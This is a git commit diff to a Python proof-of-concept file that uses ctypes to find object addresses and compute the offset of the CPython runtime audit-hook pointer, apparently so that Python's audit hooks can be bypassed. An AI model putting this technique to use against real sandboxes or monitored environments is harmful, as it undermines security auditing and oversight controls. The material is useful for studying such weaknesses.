619bd5b18ff119f959c60aa2c747044732c6d7c6
eritque0arcus <eritque-arcus@eritque-arcus.tech>
2024-02-21 11:38:50 -0500

    feat: add new way to get addr

--- POC-native.py
+++ POC-native.py
@@ -15,6 +15,8 @@ obj = ctypes.byref(ctypes.py_object(()))
 ptr_tp = ctypes.POINTER(ctypes.c_uint64)
 # somewhere in stack
 obj_addr = ctypes.cast(obj, ptr_tp).contents.value
+# we also can use the line below without creating a temporary `obj` variable
+assert ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value == obj_addr
 # offset to get audit hook pointer address (which has a "fixed" offset)
 audit_hook_ptr_offset = get_runtime_audit_hook_ptr_addr() - obj_addr
 print(f"audit_hook_ptr_offset={hex(audit_hook_ptr_offset)}")
